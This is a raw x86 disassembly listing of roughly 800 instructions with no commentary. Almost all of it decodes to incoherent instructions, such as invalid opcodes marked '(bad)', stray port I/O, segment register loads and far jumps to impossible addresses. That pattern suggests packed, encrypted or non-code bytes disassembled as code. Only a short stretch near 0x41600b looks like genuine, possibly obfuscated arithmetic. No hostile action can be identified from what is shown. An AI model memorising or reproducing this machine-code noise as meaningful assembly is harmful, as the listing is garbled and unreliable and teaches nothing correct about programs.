  415e2a:	idiv   BYTE PTR [esp+edi*1+0x468f7c1d]
  415e31:	in     al,0x77
  415e33:	add    edi,DWORD PTR [esi-0x67]
  415e36:	stc    
  415e37:	out    0x28,eax
  415e39:	btc    DWORD PTR [edi],edx
  415e3c:	jb     0x415e2c
  415e3e:	lahf   
  415e3f:	push   esi
  415e40:	add    eax,0x28298d97
  415e45:	das    
  415e46:	mov    bl,0xc0
  415e48:	push   esi
  415e49:	dec    edx
  415e4a:	mov    esi,0x9f290d78
  415e4f:	pusha  
  415e50:	pop    ds
  415e51:	xchg   ebx,eax
  415e52:	jl     0x415dd6
  415e54:	xlat   BYTE PTR ds:[ebx]
  415e55:	fist   DWORD PTR [ecx]
  415e57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e58:	mov    BYTE PTR ds:0x52f2680b,dh
  415e5e:	mov    ds:0xcfd2a649,al
  415e63:	test   eax,0xc1a8adb6
  415e68:	add    al,BYTE PTR [esp+ebp*2+0x555054fa]
  415e6f:	push   ds
  415e70:	xor    al,0xd7
  415e72:	loopne 0x415e49
  415e74:	aaa    
  415e75:	xchg   ebx,eax
  415e76:	daa    
  415e77:	vphadduwq ymm15,XMMWORD PTR [ecx-0x75]
  415e7d:	mov    ds:0x7d51da62,al
  415e82:	add    dl,BYTE PTR [esi+0x104b1c65]
  415e88:	pop    ds
  415e89:	mov    BYTE PTR [ebx+0x2f],0x2d
  415e8d:	int3   
  415e8e:	repz add bl,BYTE PTR [ebp+0x2a]
  415e92:	loope  0x415ed6
  415e94:	enter  0xc05e,0x44
  415e98:	xor    DWORD PTR [edx],0x5
  415e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e9c:	jnp    0x415ea4
  415e9e:	cmp    al,0xb0
  415ea0:	jmp    0x415ea3
  415ea2:	sub    ebx,DWORD PTR [edi-0x69]
  415ea5:	and    eax,0x31b78f3f
  415eaa:	stos   BYTE PTR es:[edi],al
  415eab:	in     eax,dx
  415eac:	add    esi,ebp
  415eae:	aas    
  415eaf:	popf   
  415eb0:	push   esp
  415eb1:	dec    esp
  415eb2:	jl     0x415e6c
  415eb4:	sub    dl,dh
  415eb6:	cmc    
  415eb7:	shl    DWORD PTR [ecx+esi*4+0x744cd151],1
  415ebe:	out    0x54,al
  415ec0:	jg     0x415e46
  415ec2:	stos   DWORD PTR es:[edi],eax
  415ec3:	lds    eax,FWORD PTR [eax+0x40]
  415ec6:	mov    sp,0xd27a
  415eca:	je     0x415eb1
  415ecc:	sub    DWORD PTR [edi],esp
  415ece:	mov    edi,0xfedfc0ee
  415ed3:	cmc    
  415ed4:	cli    
  415ed5:	aam    0x63
  415ed7:	mov    eax,0x1a6bd91a
  415edc:	xor    dl,al
  415ede:	jmp    DWORD PTR [edi-0x43]
  415ee1:	ins    BYTE PTR es:[edi],dx
  415ee2:	mov    al,0x29
  415ee4:	aaa    
  415ee5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ee6:	ror    DWORD PTR [esi+eax*2],cl
  415ee9:	out    0x40,al
  415eeb:	inc    edi
  415eec:	and    DWORD PTR [ebx+0x44],ecx
  415eef:	dec    edx
  415ef0:	ja     0x415e98
  415ef2:	es inc esi
  415ef4:	inc    esp
  415ef5:	sbb    BYTE PTR ds:[ebp+0x65],ch
  415ef9:	popa   
  415efa:	mov    ebx,DWORD PTR [ebx+0x73ca9271]
  415f00:	and    bl,BYTE PTR [ebp-0x13d9e580]
  415f06:	jae    0x415f3a
  415f08:	xchg   BYTE PTR [esi],bl
  415f0a:	mul    dh
  415f0c:	sub    dl,ah
  415f0e:	xchg   BYTE PTR fs:0x499197b6,dh
  415f15:	xor    al,0x65
  415f17:	push   0x33
  415f19:	push   ds
  415f1a:	sbb    eax,DWORD PTR [ecx]
  415f1c:	xchg   BYTE PTR [ecx],cl
  415f1e:	std    
  415f1f:	pop    ss
  415f20:	lock adc al,0x9
  415f23:	add    cl,BYTE PTR [esi+0x29b8756a]
  415f29:	adc    DWORD PTR [edx],esi
  415f2b:	shr    BYTE PTR [ebx+0x6f],1
  415f2e:	sbb    ebx,edi
  415f30:	idiv   ah
  415f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f33:	cmp    eax,0xa832526f
  415f38:	inc    esi
  415f39:	jecxz  0x415f51
  415f3b:	sbb    BYTE PTR [esi-0x497d4bcc],bh
  415f41:	sbb    eax,ecx
  415f43:	xlat   BYTE PTR ds:[ebx]
  415f44:	lds    ebp,FWORD PTR [esi]
  415f46:	and    ebp,DWORD PTR [edx+0x5d32f79c]
  415f4c:	pop    ss
  415f4d:	shl    DWORD PTR [eax],1
  415f4f:	mov    ds:0x2c79cbbf,al
  415f54:	retf   0x9a8c
  415f57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f58:	xor    ebx,edx
  415f5a:	push   eax
  415f5b:	cdq    
  415f5c:	cmp    bh,dh
  415f5e:	pushf  
  415f5f:	out    dx,eax
  415f60:	mov    esi,DWORD PTR [ebp-0x5c]
  415f63:	lahf   
  415f64:	gs and ch,dl
  415f67:	or     DWORD PTR [esi],eax
  415f69:	adc    BYTE PTR [ecx-0x6c7f26cf],ch
  415f6f:	push   ecx
  415f70:	xchg   esp,eax
  415f71:	cmp    ecx,edi
  415f73:	add    al,0x79
  415f75:	outs   dx,BYTE PTR ds:[esi]
  415f76:	mov    ah,0xca
  415f78:	into   
  415f79:	xchg   edx,esi
  415f7b:	jb     0x415f71
  415f7d:	rcr    dl,cl
  415f7f:	sub    bh,BYTE PTR [ebp+0x58ac227a]
  415f85:	push   ebx
  415f86:	jno    0x415ff3
  415f88:	mov    WORD PTR [edi-0x35],ss
  415f8b:	mov    edx,0xc94d1c1a
  415f90:	cmp    BYTE PTR [eax-0x7b],bh
  415f93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f94:	lods   eax,DWORD PTR ds:[esi]
  415f95:	leave  
  415f96:	jp     0x415f55
  415f98:	imul   esi,esp,0xffffffd7
  415f9b:	loopne 0x415feb
  415f9d:	add    eax,0x88436521
  415fa2:	xchg   ecx,eax
  415fa3:	ror    DWORD PTR [ebx],0x55
  415fa6:	cmp    bh,BYTE PTR [eax+0x7b]
  415fa9:	pop    ss
  415faa:	cdq    
  415fab:	fidiv  WORD PTR [ebx+0x704452d9]
  415fb1:	daa    
  415fb2:	cwde   
  415fb3:	imul   esi,DWORD PTR [ebx+0x4f232fc4],0x3e1d0c6c
  415fbd:	mov    ds:0xb9b0639,al
  415fc2:	and    BYTE PTR [edi-0x70676086],dh
  415fc8:	inc    ebx
  415fc9:	sub    al,0x98
  415fcc:	push   esp
  415fcd:	sub    esi,ebx
  415fcf:	fdiv   DWORD PTR gs:[edx]
  415fd2:	ds add eax,0x99af3ccd
  415fd8:	mov    bl,0xa7
  415fda:	out    0x3f,al
  415fdc:	(bad)  
  415fdd:	dec    ecx
  415fde:	dec    esp
  415fdf:	xchg   esi,eax
  415fe0:	std    
  415fe1:	sbb    al,0xa0
  415fe3:	scas   al,BYTE PTR es:[edi]
  415fe4:	sbb    eax,edi
  415fe6:	in     eax,dx
  415fe7:	and    BYTE PTR [ebp-0x4c],bl
  415fea:	fdiv   DWORD PTR [edi-0x40]
  415fed:	rcl    al,cl
  415fef:	(bad)  
  415ff0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ff1:	ja     0x416068
  415ff3:	pushf  
  415ff4:	jle    0x416006
  415ff6:	mov    ecx,0xe8aaaee5
  415ffb:	in     eax,0x5f
  415ffd:	nop
  415ffe:	adc    BYTE PTR [edx-0xccca96d],cl
  416004:	and    eax,0x5589d333
  416009:	mov    al,0x8b
  41600b:	push   ebp
  41600c:	or     BYTE PTR [ebx-0x28fc4ba3],cl
  416012:	and    edx,ebx
  416014:	mov    DWORD PTR [ebp-0x4c],edx
  416017:	mov    edx,DWORD PTR [ebp+0x8]
  41601a:	mov    ebx,DWORD PTR [ebp-0x48]
  41601d:	lea    edx,[ebx+edx*1+0x241fc1f]
  416024:	mov    DWORD PTR [ebp-0x48],edx
  416027:	mov    edx,DWORD PTR [ebp+0x8]
  41602a:	mov    ebx,0xfa5e15e2
  41602f:	sub    ebx,edx
  416031:	add    ebx,DWORD PTR [ebp-0x44]
  416034:	mov    DWORD PTR [ebp-0x44],ebx
  416037:	mov    edx,DWORD PTR [ebp+0x8]
  41603a:	xor    edx,eax
  41603c:	add    edx,esi
  41603e:	jmp    0x418387
  416043:	inc    ebp
  416044:	mov    edx,eax
  416046:	ss xchg edx,eax
  416048:	test   ebx,0x7652fd8b
  41604e:	and    eax,0x6daff0b1
  416053:	clc    
  416054:	push   ebp
  416055:	jge    0x4160d3
  416057:	inc    eax
  416058:	pop    edi
  416059:	jl     0x4160d7
  41605b:	xor    al,0xbe
  41605d:	idiv   DWORD PTR [ecx-0x57b820b4]
  416063:	jmp    0xf53d55ef
  416068:	mov    al,ds:0x49ddf189
  41606d:	xchg   DWORD PTR [edi+0x10],edi
  416070:	stos   DWORD PTR es:[edi],eax
  416071:	outs   dx,BYTE PTR ds:[esi]
  416072:	pxor   mm6,QWORD PTR [ebp-0x39030e30]
  416079:	jmp    0x9ccdfecf
  41607e:	jns    0x416087
  416080:	fsub   QWORD PTR [ebx]
  416082:	js     0x416045
  416084:	in     al,dx
  416085:	cs pusha 
  416087:	outs   dx,BYTE PTR ds:[esi]
  416088:	pop    esp
  416089:	ins    DWORD PTR es:[edi],dx
  41608a:	xchg   esp,eax
  41608b:	jb     0x41603f
  41608d:	push   ss
  41608e:	jle    0x416076
  416090:	inc    BYTE PTR [ebp+0x78870f1e]
  416096:	mov    bl,BYTE PTR [ebx]
  416098:	mov    cl,0x7c
  41609a:	lods   eax,DWORD PTR ds:[esi]
  41609b:	std    
  41609c:	push   edx
  41609d:	pop    esi
  41609e:	nop
  41609f:	fdivrp st(0),st
  4160a1:	mov    ah,0x1b
  4160a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160a4:	jg     0x4160b0
  4160a6:	jae    0x416112
  4160a8:	xor    DWORD PTR [edx-0x2e431ba8],eax
  4160ae:	mov    eax,ds:0x746c2e56
  4160b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160b4:	mov    bl,BYTE PTR [ecx]
  4160b6:	push   edi
  4160b7:	mov    ds,WORD PTR [esi-0x64]
  4160ba:	xor    eax,0x87cfbe6b
  4160bf:	and    DWORD PTR [ecx],eax
  4160c1:	mov    eax,ds:0xd4ab1f44
  4160c6:	mov    eax,ds:0xa0f1fc1e
  4160cb:	aaa    
  4160cc:	sub    al,0xca
  4160ce:	nop
  4160cf:	js     0x4160ab
  4160d1:	aaa    
  4160d2:	jp     0x416081
  4160d4:	div    DWORD PTR [ebx+esi*4]
  4160d7:	sbb    dh,BYTE PTR [ebx-0x4e]
  4160da:	sub    DWORD PTR [edx],edi
  4160dc:	mov    edi,0x411ecbca
  4160e1:	outs   dx,BYTE PTR ds:[esi]
  4160e2:	inc    edi
  4160e3:	jae    0x41606e
  4160e5:	and    BYTE PTR [edx-0x333aaa5f],bh
  4160eb:	mov    bh,cl
  4160ed:	xchg   al,ah
  4160ef:	sti    
  4160f0:	push   esp
  4160f1:	loop   0x416125
  4160f3:	gs inc eax
  4160f5:	add    cl,BYTE PTR [ecx]
  4160f7:	je     0x41607a
  4160f9:	std    
  4160fa:	dec    edi
  4160fb:	mov    ebx,0xcd2343c2
  416100:	inc    edx
  416101:	mov    esi,0xf6928db8
  416106:	cmp    al,0x83
  416108:	mov    eax,ds:0x8e10132e
  41610d:	adc    eax,0x6fc305b0
  416112:	(bad)  
  416113:	and    ebp,esi
  416115:	and    dh,BYTE PTR [edi+0x116ab5d8]
  41611b:	imul   esi,DWORD PTR [eax],0x3
  41611e:	or     eax,0x1642019
  416123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416124:	push   ecx
  416125:	push   edi
  416126:	jmp    0x5996:0xac740d60
  41612d:	mov    ebx,0x7832c40
  416132:	popf   
  416133:	js     0x4160f0
  416135:	mov    ds:0x17e5488e,al
  41613a:	aad    0xba
  41613c:	xchg   edi,eax
  41613d:	pop    edi
  41613e:	jle    0x416153
  416140:	xchg   edx,eax
  416141:	push   ss
  416142:	inc    ebp
  416143:	inc    ecx
  416144:	adc    BYTE PTR [edi+0x17],ch
  416147:	push   edi
  416148:	(bad)  [ecx]
  41614a:	fild   QWORD PTR [ebp+0x40]
  41614d:	les    ebp,FWORD PTR [esi]
  41614f:	or     eax,0x78d0d7cd
  416154:	mov    al,ds:0xc1465c5c
  416159:	(bad)  
  41615a:	into   
  41615b:	push   ecx
  41615c:	dec    edi
  41615d:	les    edi,FWORD PTR [eax]
  41615f:	dec    esi
  416160:	jl     0x4160eb
  416162:	mov    edi,0x2dfe9fa
  416167:	add    cl,BYTE PTR [ebx+0x6d3ba87a]
  41616d:	(bad)  
  41616e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41616f:	pusha  
  416170:	fs ret 0x9eb5
  416174:	mov    ah,0xb0
  416176:	mov    esi,0x9a8641c4
  41617b:	add    DWORD PTR [esi+0x48],0x16
  41617f:	sbb    BYTE PTR [ebx+0x49fd7cc8],ch
  416185:	xlat   BYTE PTR ds:[ebx]
  416186:	xor    DWORD PTR [edi+0x62],esi
  416189:	ins    BYTE PTR es:[edi],dx
  41618a:	xchg   edi,eax
  41618b:	pop    es
  41618c:	mov    dl,0x7d
  41618e:	mov    eax,0x26ed7611
  416193:	fisttp QWORD PTR [esp+eiz*8]
  416196:	push   cs
  416197:	retf   
  416198:	xchg   ecx,eax
  416199:	shld   DWORD PTR [ebp+eiz*2-0x67],ecx,0x54
  41619f:	xchg   ebx,eax
  4161a0:	sbb    al,0x89
  4161a2:	jl     0x41615f
  4161a4:	push   cs
  4161a5:	pop    edx
  4161a6:	sbb    BYTE PTR [esi+ebp*4],0xe8
  4161aa:	sub    DWORD PTR [ebp+0x17014b95],ecx
  4161b0:	fsubrp st(3),st
  4161b2:	mov    ss,WORD PTR [esi-0x7c2ed2b3]
  4161b8:	in     eax,0xd1
  4161ba:	and    eax,0x9786f7dc
  4161bf:	fcom   DWORD PTR [ebp+0x66]
  4161c2:	mov    ecx,0x5daf4b44
  4161c7:	arpl   WORD PTR [eax],bx
  4161c9:	imul   ebp,DWORD PTR ss:0xdc66e52b,0x41
  4161d1:	sbb    eax,0xf5a2625e
  4161d6:	inc    eax
  4161d7:	xchg   BYTE PTR [ebx+ebp*8],bl
  4161da:	mov    ds,WORD PTR [eax]
  4161dc:	push   ecx
  4161dd:	sub    ch,ch
  4161df:	xchg   esi,eax
  4161e0:	int    0x5d
  4161e2:	sbb    ecx,edx
  4161e4:	out    0xbd,al
  4161e6:	push   ds
  4161e7:	cdq    
  4161e8:	add    al,0xd1
  4161ea:	enter  0xd9f5,0xc
  4161ee:	push   cs
  4161ef:	mov    ch,0xa0
  4161f1:	adc    BYTE PTR [eax+0x763a0a49],dl
  4161f7:	and    esp,DWORD PTR [eax-0x2085e220]
  4161fd:	sub    eax,esp
  4161ff:	or     ebp,DWORD PTR [ecx]
  416201:	sub    dh,BYTE PTR [edx+eax*1+0x58]
  416205:	(bad)  
  416206:	hlt    
  416207:	or     esp,DWORD PTR [esp+ecx*4]
  41620a:	stc    
  41620b:	push   ds
  41620c:	in     eax,0xc9
  41620e:	fucomp st(3)
  416210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416211:	add    DWORD PTR [edx+edx*1-0xe],eax
  416215:	adc    al,0x75
  416217:	iret   
  416218:	adc    ah,al
  41621a:	ret    
  41621b:	mov    ch,0xd5
  41621d:	stos   BYTE PTR es:[edi],al
  41621e:	jo     0x41626f
  416220:	sbb    ah,BYTE PTR [ecx+0x6a]
  416223:	lahf   
  416224:	call   0x1ce2:0xdc582fd9
  41622b:	add    BYTE PTR [edx+0x924d1e5],0xe2
  416232:	xchg   ebp,eax
  416233:	ss mov edi,0x946b24f1
  41623a:	pushf  
  41623b:	icebp  
  41623c:	jmp    FWORD PTR [edi+0x29]
  41623f:	les    ecx,FWORD PTR [ecx-0x241f4b0]
  416245:	fsubrp st(4),st
  416247:	clc    
  416248:	pop    edi
  416249:	jnp    0x4161cd
  41624b:	div    DWORD PTR [esi+0x1b7740da]
  416251:	clc    
  416252:	test   eax,0xfdb73335
  416257:	adc    esi,eax
  416259:	mov    edi,0xb77b30b
  41625e:	loopne 0x416209
  416260:	jbe    0x4162bb
  416262:	add    BYTE PTR [eax],ah
  416264:	mov    ch,0x3
  416266:	int3   
  416267:	push   cs
  416268:	mov    ch,0x88
  41626a:	and    al,0x4a
  41626c:	aam    0xe0
  41626e:	jbe    0x4162e1
  416270:	in     eax,dx
  416271:	cli    
  416272:	stos   BYTE PTR es:[edi],al
  416273:	iret   
  416274:	xor    BYTE PTR [eax+eiz*8-0x48],ah
  416278:	and    ch,BYTE PTR ds:0xcc8aebb7
  41627e:	mov    al,cl
  416280:	jmp    0xaefd:0x83e684c8
  416287:	mov    ch,ah
  416289:	push   0x47d7a981
  41628e:	std    
  41628f:	repnz push ds
  416291:	mov    edi,0xef61ec2f
  416296:	mov    bh,0xdc
  416298:	fwait
  416299:	sbb    BYTE PTR [edx-0x6e6ef3d3],cl
  41629f:	or     BYTE PTR [edi],ah
  4162a1:	int3   
  4162a2:	out    dx,al
  4162a3:	or     DWORD PTR [edi-0x7d],esi
  4162a6:	and    bl,BYTE PTR [eax]
  4162a8:	add    dl,ch
  4162aa:	scas   al,BYTE PTR es:[edi]
  4162ab:	inc    eax
  4162ac:	pushf  
  4162ad:	sub    eax,0xa9c517df
  4162b2:	mov    edi,0xd2398bf9
  4162b7:	dec    esi
  4162b8:	xor    esp,edi
  4162ba:	cmp    al,0xf2
  4162bc:	add    al,0xb8
  4162be:	dec    edx
  4162bf:	mov    ?,WORD PTR [ecx]
  4162c1:	dec    esi
  4162c2:	cld    
  4162c3:	mov    esp,0xc49f3778
  4162c8:	xchg   al,bl
  4162ca:	cli    
  4162cb:	iret   
  4162cc:	xchg   edi,eax
  4162cd:	add    DWORD PTR [ebx+0x576463d2],eax
  4162d3:	leave  
  4162d4:	xor    DWORD PTR [ebx-0x4ebe7da],0x4ac1a241
  4162de:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162e1:	cdq    
  4162e2:	push   ecx
  4162e3:	dec    esp
  4162e4:	sbb    eax,0x2e950c2a
  4162e9:	data16 sahf 
  4162eb:	add    al,0x5b
  4162ed:	mov    dl,0x7
  4162ef:	je     0x4162e4
  4162f1:	mov    ds:0x9ffc74fd,al
  4162f6:	or     ecx,0xffffff98
  4162f9:	popa   
  4162fa:	or     edi,DWORD PTR [eax+0x2f]
  4162fd:	push   ebx
  4162fe:	outs   dx,DWORD PTR ds:[esi]
  4162ff:	(bad)  [edi]
  416301:	rol    BYTE PTR [esi+edi*2],0x96
  416305:	sti    
  416306:	stc    
  416307:	mov    BYTE PTR [ebx],bh
  416309:	xchg   edx,eax
  41630a:	mov    ebp,0xfdc8cf
  41630f:	xor    BYTE PTR es:[ebp-0x1d],bh
  416313:	les    ecx,FWORD PTR [eax]
  416315:	and    DWORD PTR [edx],edi
  416317:	jmp    0x41634d
  416319:	xor    bh,ah
  41631b:	(bad)  
  41631e:	jmp    0xab556046
  416323:	nop
  416324:	cmp    bl,BYTE PTR [ebp-0x23]
  416327:	leave  
  416328:	in     eax,dx
  416329:	inc    esp
  41632a:	inc    eax
  41632b:	loopne 0x41633b
  41632d:	dec    eax
  41632e:	popf   
  41632f:	dec    edi
  416330:	push   ds
  416331:	pop    ss
  416332:	cmp    al,0xd9
  416334:	mov    edi,0x9e507247
  416339:	(bad)  
  41633a:	mov    cl,0xbc
  41633c:	mov    ecx,0xf18f5216
  416341:	pop    es
  416342:	das    
  416343:	addr16 adc dh,ah
  416346:	push   ebp
  416347:	xchg   edx,eax
  416348:	jg     0x4162e6
  41634a:	lahf   
  41634b:	jl     0x4163af
  41634d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41634e:	test   eax,0xaa5fb238
  416353:	ins    BYTE PTR es:[edi],dx
  416354:	pop    ds
  416355:	imul   esp,DWORD PTR [edx+0x391ff177],0x50
  41635c:	inc    esp
  41635d:	rol    DWORD PTR [eax],1
  41635f:	aas    
  416360:	mov    ds:0x2b3a9026,eax
  416365:	mov    bh,0x79
  416367:	in     eax,dx
  416368:	pop    ecx
  416369:	cmp    eax,0xa1644544
  41636e:	add    al,0x25
  416370:	inc    edx
  416371:	cmc    
  416372:	push   0x69
  416374:	loopne 0x41638d
  416376:	xchg   esp,eax
  416377:	ins    BYTE PTR es:[edi],dx
  416378:	cdq    
  416379:	stos   DWORD PTR es:[edi],eax
  41637a:	pop    esp
  41637b:	fdiv   DWORD PTR [eax-0xe]
  41637e:	mov    bl,0xd9
  416380:	and    esi,ebx
  416382:	movd   mm5,DWORD PTR [ebx+0x2b8580c3]
  416389:	cmp    ah,BYTE PTR [edx+0x3719962c]
  41638f:	cmp    ch,BYTE PTR [ebx+0x51]
  416392:	xchg   ecx,eax
  416393:	(bad)  
  416394:	mov    eax,0xbda2d535
  416399:	ins    BYTE PTR es:[edi],dx
  41639a:	jmp    0x4163f5
  41639c:	xchg   edi,eax
  41639d:	pop    ecx
  41639e:	xor    ch,dh
  4163a0:	sti    
  4163a1:	cmp    edx,DWORD PTR [ebx]
  4163a3:	mov    ch,0x86
  4163a5:	pop    edi
  4163a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163a7:	mov    ecx,DWORD PTR [esi+0x70]
  4163aa:	jge    0x4163b2
  4163ac:	imul   edx,DWORD PTR [edx+0x1d],0xffffffd8
  4163b0:	retf   
  4163b1:	test   DWORD PTR [ecx-0x73],edx
  4163b4:	stos   DWORD PTR es:[edi],eax
  4163b5:	mov    ch,0x2c
  4163b7:	sar    BYTE PTR [esi+eax*2-0x11],1
  4163bb:	push   ecx
  4163bc:	aaa    
  4163bd:	outs   dx,BYTE PTR ds:[esi]
  4163be:	cwde   
  4163bf:	cmp    esi,DWORD PTR [eax-0x52ddb131]
  4163c5:	push   es
  4163c6:	arpl   WORD PTR [edi-0xf901f0e],bx
  4163cc:	rcr    DWORD PTR [edi],1
  4163ce:	dec    esp
  4163cf:	loope  0x416442
  4163d1:	push   ebx
  4163d2:	xchg   esp,eax
  4163d3:	push   es
  4163d4:	adc    eax,0x3beeed73
  4163d9:	ret    
  4163da:	inc    esp
  4163db:	leave  
  4163dc:	jmp    0x7634f61f
  4163e1:	dec    edx
  4163e2:	jg     0x4163a1
  4163e4:	push   ecx
  4163e5:	nop
  4163e6:	outs   dx,BYTE PTR ds:[esi]
  4163e7:	gs mov dh,0xab
  4163ea:	lods   al,BYTE PTR ds:[esi]
  4163eb:	add    DWORD PTR [edi-0xd],0x49b7aca6
  4163f2:	or     eax,0x9b3977d
  4163f7:	xchg   DWORD PTR [edi],esp
  4163f9:	dec    eax
  4163fa:	stos   BYTE PTR es:[edi],al
  4163fb:	sar    BYTE PTR [eax+ecx*4],0x31
  4163ff:	xor    eax,esi
  416401:	push   edi
  416402:	scas   eax,DWORD PTR es:[edi]
  416403:	cmc    
  416404:	leave  
  416405:	(bad)  
  416407:	aaa    
  416408:	mov    dh,dl
  41640a:	in     eax,dx
  41640b:	xlat   BYTE PTR ds:[ebx]
  41640c:	test   DWORD PTR [edi],esp
  41640e:	out    dx,al
  41640f:	addr16 sbb al,0x9d
  416412:	ret    0xcbe3
  416415:	mov    ebp,0xa9b6a452
  41641a:	jno    0x4163c8
  41641c:	(bad)  
  41641d:	aad    0x9d
  41641f:	rcr    DWORD PTR [esp+ecx*1+0x16],1
  416423:	mov    cs,WORD PTR [ebp+0x41]
  416426:	out    dx,al
  416427:	enter  0xefc5,0x84
  41642b:	or     eax,edx
  41642d:	daa    
  41642e:	sub    ebx,DWORD PTR [ecx-0x7]
  416431:	and    al,0x8b
  416433:	(bad)  
  416434:	inc    ecx
  416435:	inc    eax
  416436:	and    bl,bh
  416438:	sub    BYTE PTR [edi+0x42],0x92
  41643c:	jb     0x41645e
  41643e:	jmp    0x7414:0x6bd694
  416445:	stos   BYTE PTR es:[edi],al
  416446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416447:	add    edx,eax
  416449:	mov    ecx,0xdeaf7e17
  41644e:	sbb    edi,DWORD PTR [ecx]
  416450:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416451:	mov    BYTE PTR [edi-0x4424a32f],ch
  416457:	in     al,0xfd
  416459:	xor    ebp,DWORD PTR [ecx-0x4f]
  41645c:	stos   BYTE PTR es:[edi],al
  41645d:	in     eax,dx
  41645e:	add    eax,0x3b9828c7
  416463:	adc    BYTE PTR [ecx+0xa135778],0xa1
  41646a:	jbe    0x416485
  41646c:	sbb    al,dh
  41646e:	fs je  0x416457
  416471:	xchg   DWORD PTR [ecx-0x2f],esi
  416474:	or     al,0xbf
  416476:	fsubp  st(2),st
  416478:	iret   
  416479:	add    cl,BYTE PTR [ebx+0x3bd36ec2]
  41647f:	imul   edx,DWORD PTR [edi+0x7d],0x6ad8390b
  416486:	inc    ebp
  416487:	lea    ebx,[eax-0x59]
  41648a:	jle    0x416455
  41648c:	inc    ebx
  41648d:	popf   
  41648e:	mov    edx,0x6a3f7f5c
  416493:	pop    es
  416494:	and    al,0x6a
  416496:	loopne 0x4164f2
  416498:	ins    BYTE PTR es:[edi],dx
  416499:	ror    DWORD PTR [ebx+0xc],0xee
  41649d:	inc    edi
  41649e:	push   edi
  41649f:	ficomp WORD PTR [ecx+ecx*1]
  4164a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164a3:	pop    ds
  4164a4:	int3   
  4164a5:	dec    esp
  4164a6:	mov    ch,0xb4
  4164a8:	daa    
  4164a9:	ss ja  0x41647b
  4164ac:	inc    edi
  4164ad:	dec    edi
  4164ae:	scas   eax,DWORD PTR es:[edi]
  4164af:	ret    0x3971
  4164b2:	or     eax,0x1e445af6
  4164b7:	mov    bl,0xd7
  4164b9:	or     al,0xc
  4164bb:	aad    0xb5
  4164bd:	(bad)  
  4164bf:	int3   
  4164c0:	scas   al,BYTE PTR es:[edi]
  4164c1:	adc    dl,BYTE PTR [ebp+esi*4-0x37e8f39f]
  4164c8:	sbb    eax,0x5ce35a72
  4164cd:	add    al,0x35
  4164cf:	jae    0x4164e2
  4164d1:	xchg   BYTE PTR [edi+eiz*8],cl
  4164d4:	pop    edx
  4164d5:	aam    0xe1
  4164d7:	ds cli 
  4164d9:	fidiv  WORD PTR [bx+di]
  4164dc:	lea    ecx,[ebp-0x5f2d53e5]
  4164e2:	stos   BYTE PTR es:[edi],al
  4164e3:	out    0x1a,eax
  4164e5:	jae    0x416473
  4164e7:	sbb    al,0x9b
  4164e9:	sahf   
  4164ea:	(bad)  [ebx+0x7c]
  4164ed:	outs   dx,BYTE PTR ds:[esi]
  4164ee:	mov    esi,0x852213b1
  4164f3:	ss mov ah,0xd5
  4164f6:	add    DWORD PTR [ebp-0x7a],ebp
  4164f9:	xor    ebx,edi
  4164fb:	scas   eax,DWORD PTR es:[edi]
  4164fc:	add    DWORD PTR [ebx],ebx
  4164fe:	out    0xbb,eax
  416500:	inc    ebx
  416501:	ret    
  416502:	int    0xea
  416504:	stos   DWORD PTR es:[edi],eax
  416505:	ds scas al,BYTE PTR es:[edi]
  416507:	loopne 0x41657b
  416509:	mov    al,0xab
  41650b:	mov    bl,0x44
  41650d:	outs   dx,BYTE PTR ds:[esi]
  41650e:	xor    cl,al
  416510:	xor    bh,BYTE PTR [ecx]
  416512:	add    al,0xb7
  416514:	inc    ebp
  416515:	inc    edi
  416516:	hlt    
  416517:	sub    BYTE PTR [edx+eiz*1+0x5a],cl
  41651b:	arpl   WORD PTR [ebp-0x2c35fcb1],si
  416521:	pop    edi
  416522:	outs   dx,DWORD PTR ds:[esi]
  416523:	ror    edi,1
  416525:	cwde   
  416526:	mov    ?,WORD PTR [edx]
  416528:	push   eax
  416529:	jnp    0x416597
  41652b:	ins    BYTE PTR es:[edi],dx
  41652c:	or     ch,dh
  41652e:	data16 int3 
  416530:	mov    bl,0x7a
  416532:	push   0xcb657910
  416537:	add    dh,BYTE PTR [ecx-0x5b]
  41653a:	(bad)  
  41653b:	jg     0x4165b1
  41653d:	mov    ah,0x41
  41653f:	dec    eax
  416540:	jle    0x416551
  416542:	mov    ds,WORD PTR [edx+0x8]
  416545:	pop    edi
  416546:	std    
  416547:	inc    ebx
  416548:	xchg   edi,eax
  416549:	adc    dh,BYTE PTR [ebx-0x2a]
  41654c:	jno    0x4165a9
  41654e:	je     0x4164d9
  416550:	xchg   ebp,eax
  416551:	xchg   esp,eax
  416553:	lock addr16 pop ecx
  416556:	pop    esp
  416557:	add    esp,DWORD PTR [eax+0x6d481a77]
  41655d:	in     al,dx
  41655e:	test   bh,bh
  416560:	push   edx
  416561:	daa    
  416562:	(bad)  [esi]
  416564:	cdq    
  416565:	inc    esp
  416566:	xchg   esp,eax
  416567:	ror    cl,1
  416569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41656a:	shl    BYTE PTR [ecx-0x65],0x4b
  41656e:	daa    
  41656f:	adc    DWORD PTR [edi+0x3a],0xffffffa7
  416573:	mov    ecx,0xd60a756e
  416578:	mov    ebx,0x833228b4
  41657d:	int    0xc2
  41657f:	mov    BYTE PTR [ebx+ecx*1],cl
  416582:	int    0xaa
  416584:	dec    edx
  416585:	xchg   ecx,eax
